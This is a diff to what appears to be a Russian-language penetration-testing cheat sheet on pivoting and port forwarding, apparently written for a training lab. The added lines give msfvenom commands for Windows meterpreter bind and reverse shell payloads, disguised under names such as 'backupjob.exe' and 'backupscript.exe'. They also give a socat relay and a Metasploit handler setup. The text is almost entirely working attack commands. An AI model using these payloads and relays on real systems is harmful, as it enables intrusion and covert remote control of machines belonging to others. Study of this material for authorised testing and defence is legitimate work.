@@ -448,7 +448,17 @@ route add 10.10.10.0/23 mask 255.255.254.0 192.168.50.123
 		socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:8001
 
 		msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
-		
+
+# Проброс BIND соединения socat
+		msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
+		socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
+
+		use exploit/multi/handler
+		set payload windows/x64/meterpreter/bind_tcp
+		set RHOST 10.129.202.64
+		set LPORT 8080
+		run
+
 # Проброс портов Metasploit
 	
  	portfwd add -l 3306 -r 127.0.0.1 -p 14406
